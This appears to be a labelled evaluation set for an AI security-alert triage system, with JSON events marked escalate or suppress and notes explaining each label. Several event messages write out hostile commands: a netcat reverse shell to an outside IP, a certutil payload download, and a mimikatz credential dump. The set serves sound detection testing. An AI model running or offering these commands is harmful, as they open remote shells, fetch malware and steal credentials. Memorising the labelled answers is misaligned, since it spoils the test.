# Labeled eval set for the LLM tier - one case per line, JSON.
# Fields: event (Event kwargs), criticality, history_summary, facts,
# expected ("escalate"|"suppress"), category, notes (why this label).
#
# Categories:
#   attack_clear         - unambiguous attack, obvious indicators. Must escalate.
#   attack_subtle         - real attack with no hot-keyword tells; tests whether
#                           the model reasons about the pattern, not just greps it.
#   attack_fact_trap      - a plausible-looking environment fact is present but
#                           must NOT excuse credential abuse / privilege escalation
#                           / lateral movement, per the system prompt rule.
#   benign_explained      - anomaly with a fact that directly and specifically
#                           covers it. Should suppress.
#   benign_unexplained    - anomaly with no supporting fact/history; policy says
#                           erring toward escalate is correct even if probably noise.
#   benign_ambiguous_context - benign, but requires weighing a fact against the
#                           specifics of the event (not just a keyword match).
{"event": {"source": "auditd", "host": "db-prod-01", "event_type": "reverse_shell", "message": "postgres user spawned: nc -e /bin/sh 45.83.20.11 4444", "severity": 7.0, "fields": {"user": "postgres", "dst_ip": "45.83.20.11"}}, "criticality": 2.0, "facts": [], "expected": "escalate", "category": "attack_clear", "notes": "textbook reverse shell on the crown-jewel DB."}
{"event": {"source": "edr", "host": "dc-01", "event_type": "credential_dump", "message": "mimikatz.exe executed with sekurlsa::logonpasswords argument", "severity": 8.5, "fields": {"user": "SYSTEM"}}, "criticality": 2.0, "facts": [], "expected": "escalate", "category": "attack_clear", "notes": "credential dumping tool on the domain controller."}
{"event": {"source": "edr", "host": "file-srv-01", "event_type": "mass_file_op", "message": "14,200 files renamed with .locked extension in 90 seconds under /shares/finance", "severity": 9.0, "fields": {"count": 14200}}, "criticality": 1.8, "facts": [], "expected": "escalate", "category": "attack_clear", "notes": "ransomware encryption signature."}
{"event": {"source": "cloudtrail", "host": "aws-acct-prod", "event_type": "iam_policy_change", "message": "IAM user svc-reporting attached policy AdministratorAccess to itself from IP 91.203.5.12 (outside corporate VPN ranges)", "severity": 7.0, "fields": {"user": "svc-reporting", "src_ip": "91.203.5.12"}}, "criticality": 2.0, "facts": [], "expected": "escalate", "category": "attack_clear", "notes": "self-granted admin from an unrecognized IP - classic privilege escalation."}
{"event": {"source": "auditd", "host": "web-prod-01", "event_type": "process_exec", "message": "www-data executed: certutil -urlcache -f http://update-cdn-mirror.net/patch.exe payload.exe", "severity": 6.5, "fields": {"user": "www-data"}}, "criticality": 1.6, "facts": [], "expected": "escalate", "category": "attack_clear", "notes": "certutil LOLBin download, classic living-off-the-land technique."}
{"event": {"source": "cloudtrail", "host": "aws-acct-prod", "event_type": "data_access", "message": "service account svc-analytics authenticated from a new ASN it has never used, then exported the full customers table to a presigned S3 URL within 2 minutes", "severity": 5.5, "fields": {"user": "svc-analytics", "table": "customers"}}, "criticality": 2.0, "facts": [], "expected": "escalate", "category": "attack_subtle", "notes": "no exfil/attack keywords - tests whether the model reads new-location + immediate-bulk-export as a pattern."}
{"event": {"source": "dns", "host": "db-prod-01", "event_type": "dns_query_burst", "message": "412 TXT record queries to a single subdomain of freshly-registered domain qz9x1-cdn.net over 6 minutes", "severity": 4.5, "fields": {"domain": "qz9x1-cdn.net", "count": 412}}, "criticality": 2.0, "facts": [], "expected": "escalate", "category": "attack_subtle", "notes": "DNS tunneling / C2 beaconing signature without the word 'exfiltration' anywhere."}
{"event": {"source": "edr", "host": "dev-laptop-17", "event_type": "process_exec", "message": "winword.exe spawned powershell.exe with an encoded command argument, three seconds after the user opened Invoice_2847.docm from email", "severity": 6.0, "fields": {"user": "priya", "parent": "winword.exe"}}, "criticality": 0.6, "facts": [], "expected": "escalate", "category": "attack_subtle", "notes": "macro-delivered PowerShell (T1204/T1059) - no 'malware' keyword, tests process-lineage reasoning."}
{"event": {"source": "auditd", "host": "web-prod-01", "event_type": "ssh_key_added", "message": "new key added to /root/.ssh/authorized_keys from 103.41.20.9, an IP outside the documented on-call VPN range", "severity": 6.5, "fields": {"user": "root", "src_ip": "103.41.20.9"}}, "criticality": 1.6, "facts": ["on-call engineers occasionally SSH in as root during incidents"], "expected": "escalate", "category": "attack_fact_trap", "notes": "the on-call fact covers root SSH sessions, not a NEW persistent key from an unrecognized IP range - must not be excused."}
{"event": {"source": "auditd", "host": "db-prod-01", "event_type": "user_created", "message": "vendor-diagnostics account created a second account 'svc-backup2' with sudo NOPASSWD and hid it from the login banner", "severity": 6.5, "fields": {"user": "vendor-diagnostics"}}, "criticality": 2.0, "facts": ["vendor X has an authorized support contract with read-only diagnostic access to db-prod-01"], "expected": "escalate", "category": "attack_fact_trap", "notes": "the fact authorizes read-only diagnostics, not creating a hidden privileged account - privilege escalation is never excused by a fact."}
{"event": {"source": "auditd", "host": "db-prod-01", "event_type": "firewall_change", "message": "backup service account modified iptables to allow inbound RDP (3389) from 0.0.0.0/0 during the nightly backup window", "severity": 7.0, "fields": {"user": "svc-backup", "port": 3389}}, "criticality": 2.0, "facts": ["nightly backups run at 02:00 and restart the postgres service; IO spikes during this window are normal"], "expected": "escalate", "category": "attack_fact_trap", "notes": "the backup-window fact explains IO/restarts, not opening RDP to the entire internet - that's exposure, not a backup side-effect."}
{"event": {"source": "auditd", "host": "web-prod-01", "event_type": "data_upload", "message": "user in the finance group uploaded a backup archive to an external host, outside the finance backup laptop's usual nightly destination", "severity": 5.5, "fields": {"user": "finance-svc"}}, "criticality": 1.6, "facts": ["the finance team's backup laptop performs disk encryption and nightly backups"], "expected": "escalate", "category": "attack_fact_trap", "notes": "shares words 'finance'/'backup'/'nightly' with the fact (a crude keyword-overlap heuristic would suppress this) but the destination doesn't match - likely exfil dressed as routine backup."}
{"event": {"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "disk IO spike to 9100 IOPS on /var/lib/postgresql at 02:14", "severity": 2.0, "fields": {"iops": 9100}}, "criticality": 2.0, "history_summary": "first occurrence of this signature", "facts": ["nightly backups run at 02:00 and restart the postgres service; IO spikes during this window are normal"], "expected": "suppress", "category": "benign_explained", "notes": "matches the backup-window fact directly, no privilege or credential angle."}
{"event": {"source": "auditd", "host": "ci-runner-01", "event_type": "process_burst", "message": "187 short-lived build containers spawned and torn down in 8 minutes", "severity": 4.0, "fields": {"count": 187}}, "criticality": 0.8, "facts": ["ci-runner-01 spawns many short-lived containers; process churn is expected"], "expected": "suppress", "category": "benign_explained", "notes": "documented CI churn pattern."}
{"event": {"source": "systemd", "host": "web-prod-01", "event_type": "service_restart", "message": "nginx restarted automatically after certbot renewed the TLS certificate", "severity": 2.5, "fields": {"service": "nginx"}}, "criticality": 1.6, "facts": ["certbot renews TLS certs monthly and restarts nginx as part of the renewal hook"], "expected": "suppress", "category": "benign_explained", "notes": "routine cert renewal side effect."}
{"event": {"source": "sshd", "host": "web-prod-01", "event_type": "auth_failure_burst", "message": "63 failed logins from 198.51.100.44 over 10 minutes, all against decommissioned test accounts, no successful login", "severity": 4.0, "fields": {"src_ip": "198.51.100.44"}}, "criticality": 1.6, "facts": ["198.51.100.44 is the documented source IP for the quarterly authorized pentest, scheduled for this week"], "expected": "suppress", "category": "benign_explained", "notes": "matches both the specific IP and the scheduled window of an authorized test - no successful auth."}
{"event": {"source": "edr", "host": "dev-laptop-42", "event_type": "resource_spike", "message": "CPU pegged at 100% and heavy outbound traffic to registry.npmjs.org for 6 minutes during a full dependency reinstall", "severity": 3.0, "fields": {"host": "dev-laptop-42"}}, "criticality": 0.5, "facts": ["dev-laptop-42's owner regularly runs large local builds that spike CPU and package-registry traffic"], "expected": "suppress", "category": "benign_explained", "notes": "matches a documented developer workflow, destination is the legitimate public npm registry."}
{"event": {"source": "auditd", "host": "dc-01", "event_type": "bulk_password_reset", "message": "15 employee accounts had passwords reset by IT admin jsmith between 09:00-09:20", "severity": 4.5, "fields": {"user": "jsmith", "count": 15}}, "criticality": 2.0, "history_summary": "first occurrence of this signature", "facts": ["a company-wide credential rotation, run by IT admin jsmith, is scheduled for this morning"], "expected": "suppress", "category": "benign_ambiguous_context", "notes": "bulk resets alone look scary, but the scope (resets only, no new accounts/privilege grants) and specific match to a scheduled, named event make this benign."}
{"event": {"source": "auditd", "host": "ci-runner-01", "event_type": "sudo_usage", "message": "deploy-bot invoked sudo systemctl restart app 41 times during a rolling deployment", "severity": 3.5, "fields": {"user": "deploy-bot", "count": 41}}, "criticality": 0.8, "facts": ["deploy-bot is the CI/CD pipeline's service account and restarts services as part of every deployment"], "expected": "suppress", "category": "benign_ambiguous_context", "notes": "high sudo count is proportional to a normal rolling deploy, by the known deploy service account only."}
{"event": {"source": "monitoring", "host": "web-prod-01", "event_type": "service_restart", "message": "app service restarted twice during the scheduled patch window", "severity": 3.0, "fields": {}}, "criticality": 1.6, "facts": ["OS and app patches are deployed every second Tuesday; service restarts during that window are expected"], "expected": "suppress", "category": "benign_ambiguous_context", "notes": "restart count and timing both fit the documented patch cadence."}
{"event": {"source": "sshd", "host": "web-prod-01", "event_type": "auth_failure", "message": "failed password for invalid user admin from 203.0.113.9", "severity": 3.0, "fields": {"src_ip": "203.0.113.9", "user": "admin"}}, "criticality": 1.6, "facts": [], "expected": "escalate", "category": "benign_unexplained", "notes": "probably background internet noise, but first occurrence with zero supporting evidence - policy says lean escalate, not suppress on a hunch."}
{"event": {"source": "auditd", "host": "dev-laptop-17", "event_type": "cron_failure", "message": "local cron job 'cleanup-tmp' failed 3 times in a row with permission denied", "severity": 3.0, "fields": {}}, "criticality": 0.6, "facts": [], "expected": "escalate", "category": "benign_unexplained", "notes": "almost certainly benign misconfiguration, but nothing in context explains it yet - should not be suppressed on priors alone."}
{"event": {"source": "auditd", "host": "unknown-host-99", "event_type": "user_created", "message": "new user 'support_tmp' created with uid 0", "severity": 5.0, "fields": {"user": "support_tmp", "uid": 0}}, "criticality": 1.3, "facts": [], "expected": "escalate", "category": "attack_clear", "notes": "unrecognized asset creating a uid-0 account - elevated default criticality for unknown hosts applies."}
{"event": {"source": "auditd", "host": "dev-laptop-42", "event_type": "priv_escalation", "message": "user jenny added to sudo group by process /tmp/.helper; new crontab entry installed immediately after", "severity": 6.0, "fields": {"user": "jenny", "binary": "/tmp/.helper"}}, "criticality": 0.5, "facts": [], "expected": "escalate", "category": "attack_clear", "notes": "low asset value should not lower the bar - hidden binary granting sudo plus persistence is unambiguous."}
